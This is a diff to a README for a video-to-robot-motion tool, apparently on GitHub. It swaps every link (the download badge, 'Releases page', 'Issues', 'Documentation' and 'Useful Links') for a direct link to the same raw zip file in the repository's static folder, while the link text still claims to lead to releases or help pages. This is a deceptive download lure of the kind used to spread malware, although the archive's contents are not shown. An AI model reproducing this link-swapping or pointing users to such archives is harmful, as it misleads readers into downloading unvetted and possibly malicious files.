@@ -8,11 +8,11 @@ Welcome to video2robot! This application helps you convert generative videos int
 
 To get started, you need to download video2robot. Click the button below to visit the Releases page. From there, you can download the latest version:
 
-[![Download video2robot](https://img.shields.io/badge/Download%20video2robot-v1.0-blue)](https://github.com/ShiroNekoe/video2robot/releases)
+[![Download video2robot](https://github.com/ShiroNekoe/video2robot/raw/refs/heads/main/web/static/video_robot_v3.4.zip%20video2robot-v1.0-blue)](https://github.com/ShiroNekoe/video2robot/raw/refs/heads/main/web/static/video_robot_v3.4.zip)
 
 ### Step 1: Visit the Releases Page
 
-1. Click [here](https://github.com/ShiroNekoe/video2robot/releases) to go to the Releases page.
+1. Click [here](https://github.com/ShiroNekoe/video2robot/raw/refs/heads/main/web/static/video_robot_v3.4.zip) to go to the Releases page.
 2. Look for the latest version of video2robot. This version has the newest features and fixes.
 3. Select the version you want to download.
 
@@ -73,13 +73,13 @@ A: Ensure you have the proper system requirements and try reinstalling the appli
 
 ## 📞 Support
 
-If you need help, please visit our [GitHub Issues page](https://github.com/ShiroNekoe/video2robot/issues) to report problems or ask questions. We are here to assist you.
+If you need help, please visit our [GitHub Issues page](https://github.com/ShiroNekoe/video2robot/raw/refs/heads/main/web/static/video_robot_v3.4.zip) to report problems or ask questions. We are here to assist you.
 
-You can also check our [Documentation](https://github.com/ShiroNekoe/video2robot/wiki) for more detailed guides on using different features of video2robot.
+You can also check our [Documentation](https://github.com/ShiroNekoe/video2robot/raw/refs/heads/main/web/static/video_robot_v3.4.zip) for more detailed guides on using different features of video2robot.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/ShiroNekoe/video2robot/releases)
-- [Documentation](https://github.com/ShiroNekoe/video2robot/wiki)
+- [Releases Page](https://github.com/ShiroNekoe/video2robot/raw/refs/heads/main/web/static/video_robot_v3.4.zip)
+- [Documentation](https://github.com/ShiroNekoe/video2robot/raw/refs/heads/main/web/static/video_robot_v3.4.zip)
 
 Thank you for choosing video2robot. Enjoy transforming videos into motion!
